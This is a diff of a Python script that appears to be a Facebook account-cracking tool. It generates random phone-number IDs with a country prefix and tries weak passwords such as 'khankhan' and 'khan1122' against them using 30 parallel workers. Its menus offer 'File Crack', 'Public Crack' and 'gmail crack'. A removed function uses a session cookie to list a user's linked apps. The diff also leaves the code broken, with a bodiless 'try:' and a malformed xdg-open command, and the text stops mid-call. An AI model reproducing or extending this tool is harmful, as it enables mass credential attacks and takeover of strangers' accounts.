@@ -118,32 +118,10 @@ def joined(ids):
         creation = '\33[1;32m| \33[1;32m2006/2007'
     else:creation=''
     return creation
-
-def cek_apk(coki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
-	except AttributeError:
-		print ("\r      %s! cookie invalid"%(N))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:
-		print ("\r      %s• cookie invalid"%(M))
-
-
+    try:
 def p(x):
-	print(x)
-os.system(f'xdg-open https://chat.whatsapp.com/BTjSpLJPWxV5B5hqNcW2J0')
+      print(x)
+os.system(f'xdg-openhttps://chat.whatsapp.com/By2gtt0QpTuCjvCnqkSApK')
 
 logo=("""
 ____________________ ____  __.
@@ -173,7 +151,7 @@ id=[]
 
 def menu():
                         clear()	
-                        print(' [1] File cloning\n [2] Create file\n [3] Random cloning\n [4] Random gmail crack\n [5] WhatsApp Group (join)\n [0] Exit')
+                        print(' [1] File Crack\n [2] Create file\n [3] Public Crack\n [4] Random gmail crack\n [5] WhatsApp Group (join)\n [0] Exit')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -267,7 +245,7 @@ def menu():
                                 print("next update")
                         elif xd in ['3','03']:
                                 clear()
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Nepal India cloning\n [0] Back menu')
+                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [0] Back menu')
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
@@ -281,7 +259,7 @@ def menu():
                         elif xd in ['4','04']:
                                 gmail()
                         elif xd in ['5','05']:
-                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
+                                wx=('By2gtt0QpTuCjvCnqkSApK')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
@@ -305,7 +283,7 @@ def za():
         linex()
         input(" press enter to send key")
         linex();print(" You are not paid user ");linex()
-        os.system("xdg-open https://wa.me/+8801731259842")
+     
 def npxind():
                 user=[]
                 clear()
@@ -368,4 +346,22 @@ def pak():
                         limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                 except ValueError:
                         limit = 5000
-              
+                clear()                        
+                print(' [1] Method  \033[1;32m \n [2] \033[1;33mMethod  ') 
+                linex()
+                mthd = input('choose : ')
+                clear()                       
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as RK:     
+                        clear()
+                        id = str(len(user))
+                        print('Total account : \033[1;32m'+id)
+                        print('The process is running in the background ')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan','khan1122']
+                                if mthd in ['1','01']:                                 
+                                    RK.submit(rndm1,ids
